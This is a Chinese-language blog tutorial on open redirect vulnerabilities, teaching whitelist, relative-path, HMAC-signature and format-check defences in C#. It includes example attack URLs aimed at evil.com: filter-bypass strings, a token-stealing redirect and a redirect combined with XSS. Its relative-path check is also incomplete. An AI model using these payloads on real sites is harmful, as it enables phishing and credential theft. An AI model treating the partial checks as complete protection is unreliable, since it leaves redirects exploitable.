---
title: Open Redirect
date: 2025-11-18 23:51:11
categories: 蒼き盾
top_img: https://github.com/CHI-KEKE/pics/blob/main/Security/wolf.png?raw=true
cover : https://github.com/CHI-KEKE/pics/blob/main/Security/wolf.png?raw=true
tags:
    - 蒼き盾
toc:
toc_number:
comments :
---


{% tabs 商店後台的身分驗證%}

<!-- tab 不安全的轉導（Open Redirect）-->

🔆🔆 「🇯🇵 日本電商客服 月薪 8 萬｜包吃住｜合法公司詳情私我」 🔆🔆 

<br>

他心想，「哇，日本耶！而且朋友的朋友介紹，應該很穩吧。」

於是他私訊、面試、簽約，一切流程超順，順到像自動登入了光明人生。後來對方說了：「先飛曼谷，再有人帶你過去。」

他當下沒有多想，就像看到網址是 **https://trusted-company.com**，沒去看後面的參數

<br>

下飛機後，接他的人說：「等等換一台車。」

換著換著，風景從市區 → 郊外 → 鐵門 → ❌ 404：你以為的人生不在這裡

<br>
<br>

Open Redirect 本質是，「把跳轉控制權交給使用者，卻沒有驗證對方要帶你去哪裡」，這會讓原本可信的網站，變成幫攻擊者背書的跳板

https://nice.com/redirect?target=https://phishing-site.com


![ff](https://raw.githubusercontent.com/CHI-KEKE/pics/refs/heads/main/Codesss/Cyber/Open-Redirect/1__path.png)


因此，若應用程式提供 redirect 功能（例如 /redirect），使用者可以透過 `query parameter`（如 target）指定跳轉目的地，而伺服器收到請求後，不檢查 URL 是否安全或在白名單內，直接回傳 `302 / 301`，瀏覽器就照指示跳轉，使用者從「看起來合法的網址」被帶到「實際惡意的網站」，原本以為是 NICE.con 的網域，實際卻跳到釣魚頁面，如果再搭配登入流程（例如 OAuth `redirect_uri`），甚至導致帳號或 Token 外洩!


<br>

![fish](https://raw.githubusercontent.com/CHI-KEKE/pics/refs/heads/main/Codesss/Cyber/Open-Redirect/1___how_to_deceive.png)

<!-- endtab -->

<!-- tab 白名單（Whitelist）驗證-->

「不是我家的人，我不幫你帶路。」白名單（Whitelist）驗證只允許跳轉到「自己信任的網域」。這是最強也最容易理解的原則，你只讓系統去已經列入白名單的網域，其他通通拒絕

```csharp
var allowedDomains = new[]
{
    "friend.com",
    "family.com",
    "lover.com"
};

public IActionResult SafeRedirect(string targetUrl)
{
    if (!Uri.TryCreate(targetUrl, UriKind.Absolute, out var uri))
        return BadRequest("Invalid URL");

    if (!allowedDomains.Contains(uri.Host))
        return BadRequest("Domain not allowed");

    return Redirect(targetUrl);
}
```

- 最單純、安全
- 不怕參數被改，只要不在白名單就不跳


![xc](https://raw.githubusercontent.com/CHI-KEKE/pics/refs/heads/main/Codesss/Cyber/Open-Redirect/4_whitelist.png)


<!-- endtab -->

<!-- tab Relative Path-->

如果跳轉目的地只會在「網站內部」，那根本不需要完整 URL。你只要接受 `/account/profile` 這種相對路徑即可，這可以阻止攻擊者塞入外部 URL，例如：`https://evil.com`

```csharp
public IActionResult SafeRedirect(string path)
{
    // 禁止出現冒號、兩斜線等可以跳出網站的字樣
    if (path.StartsWith("http", StringComparison.OrdinalIgnoreCase) ||
        path.Contains("//"))
        return BadRequest("Invalid redirect path");

    return Redirect(path);
}
```

- 直接卡住外部跳轉
- 最適用於「登入後跳回上一頁」等站內流程

![ff](https://raw.githubusercontent.com/CHI-KEKE/pics/refs/heads/main/Codesss/Cyber/Open-Redirect/4__relative.png)


<!-- endtab -->

<!-- tab 加簽驗證（Signature）-->

有些活動連結必須動態生成，例如行銷系統：`https://promo.91app.com/redirect?target=xxx`，但如果 target 可以被隨意改，就可能變釣魚網址，因此在產生的 URL 上加一個 HMAC 簽章（sig），伺服器收到後重新驗證是否被改過

```csharp
string GenerateSignature(string secret, string target)
{
    using var hmac = new HMACSHA256(Encoding.UTF8.GetBytes(secret));
    var hash = hmac.ComputeHash(Encoding.UTF8.GetBytes(target));
    return Convert.ToBase64String(hash);
}

var target = "https://shop.91app.com";
var sig = GenerateSignature(secret, target);

var finalUrl = $"https://promo.91app.com/redirect?target={WebUtility.UrlEncode(target)}&sig={sig}";


public IActionResult SecureRedirect(string target, string sig)
{
    var expectedSig = GenerateSignature(secret, target);

    if (sig != expectedSig)
        return BadRequest("Invalid signature");

    return Redirect(target);
}
```

即使 attacker 改掉 target，簽章不會對，則系統就不跳，完全防止 URL 被竄改!


![dd](https://raw.githubusercontent.com/CHI-KEKE/pics/refs/heads/main/Codesss/Cyber/Open-Redirect/4__signature.png)


<!-- endtab -->

<!-- tab 限制參數長度與格式— 防止繞過技巧-->

攻擊者會利用特殊符號繞過你的 Host 或 Path 判斷

<br>

##　//evil.com —— 利用「相對協定（Scheme-relative URL）」

攻擊用法　`https://promo.91app.com/redirect?target=//evil.com`
瀏覽器怎麼解讀？　`//evil.com`　「沿用目前頁面的 scheme（https），但 host 是 evil.com」

後端應該怎麼擋?

```csharp
Uri.TryCreate(target, UriKind.Absolute, out var uri)
```

<br>

## %2F%2Fevil.com —— URL Encoding 混淆

解碼流程

| 階段           | 值                  |
| ------------ | ------------------ |
| 原始字串         | `%2F%2Fevil.com`   |
| URL Decode 後 | `//evil.com`       |
| 瀏覽器解析        | `https://evil.com` |



- %2F%2Fevil.com
- http:@evil.com
- \evil.com


![aa](https://raw.githubusercontent.com/CHI-KEKE/pics/refs/heads/main/Codesss/Cyber/Open-Redirect/3__way_to_bypass.png)


因此必須加入「格式限制」

```csharp
public IActionResult StrictRedirect(string target)
{
    if (target.Length > 2000)
        return BadRequest("URL too long");

    if (!Uri.TryCreate(target, UriKind.Absolute, out var uri))
        return BadRequest("Invalid URL");

    // 只接受 https
    if (uri.Scheme != Uri.UriSchemeHttps)
        return BadRequest("HTTPS required");

    // Host 必須符合格式
    if (!Regex.IsMatch(uri.Host, @"^[a-zA-Z0-9\.-]+$"))
        return BadRequest("Invalid host format");

    // 禁止跳脫字元
    var invalidPatterns = new[] { "%2F", "%5C", "@", "\\", "//" };
    if (invalidPatterns.Any(p => target.Contains(p)))
        return BadRequest("Invalid characters found");

    return Redirect(target);
}
```

| 原則                  | 目的           |
| ------------------- | ------------ |
| 白名單（Whitelist）      | 只有信任網域能跳轉    |
| 相對路徑（Relative Path） | 防止外部網址直接跳走   |
| 加簽（HMAC Signature）  | 避免被竄改 target |
| 格式與長度限制             | 防止特殊符號繞過判斷   |



![f](https://raw.githubusercontent.com/CHI-KEKE/pics/refs/heads/main/Codesss/Cyber/Open-Redirect/4__strict_hygiene.png)


<!-- endtab -->

<!-- tab 增加跳轉提示頁（中介頁)-->

您即將前往外部網站：phishing-site.com
是否繼續？

[繼續] [取消]


![ss](https://raw.githubusercontent.com/CHI-KEKE/pics/refs/heads/main/Codesss/Cyber/Open-Redirect/2__stay_a%20_bit_fix.png)


<!-- endtab -->

<!-- tab 攻擊手法-->

## 🧨 釣魚（Phishing Attack）

「恭喜您獲得美女泳裝照，請點以下連結領取！」👉 https://promo.nice.com/redirect?target=https://pics.evil.com
接著使用者信任 promo.nice.com/，點了進去。系統轉導到駭客的假網站（長得像登入頁），使用者輸入帳密。駭客竊取帳號密碼。所以，雖然你「沒有被入侵」，但你的轉導 URL 成了「釣魚跳板」

<br>

## 🧨 Session / Token 竊取

假設促購中心會在 URL 帶登入憑證或授權碼

`https://promo.nice.com/redirect?target=https://shop.nice.com&token=abcd1234`

如果 target 被改成

`https://promo.nice.com/redirect?target=https://evil.com/steal?token=abcd1234`

伺服器就會把使用者帶去惡意站點，token 也一併暴露。系統親手把登入憑證送給駭客，駭客拿到 token，就能假冒使用者登入系統

<br>

## 🧨 混合攻擊（Open Redirect + XSS）

找出開放轉導的 URL，搭配 JavaScript 注入或 URL encoding，繞過限制

`/redirect?target=https://evil.com/%0A<script>alert(1)</script>`

若網站對 URL 未做適當編碼或 escaping，就可能導致 跨站腳本攻擊（XSS），駭客工具會自動掃描網站上的可疑參數，例如：

- `?redirect=`
- `?next=`
- `?target=`
- `?url=`
- `?returnUrl=`

一旦發現能帶外部網址而仍能成功跳轉，他們就知道這是「開放轉導漏洞」。甚至有專門的掃描器（如 Burp Suite、ZAP、Acunetix）會報出：`Open Redirect vulnerability detected`


![c](https://raw.githubusercontent.com/CHI-KEKE/pics/refs/heads/main/Codesss/Cyber/Open-Redirect/1__attack_type.png)



<!-- endtab -->


<!-- tab summary-->


![cc](https://raw.githubusercontent.com/CHI-KEKE/pics/refs/heads/main/Codesss/Cyber/Open-Redirect/5_checklist.png)

![cv](https://raw.githubusercontent.com/CHI-KEKE/pics/refs/heads/main/Codesss/Cyber/Open-Redirect/unnamed.png)

<!-- endtab -->

{% endtabs %}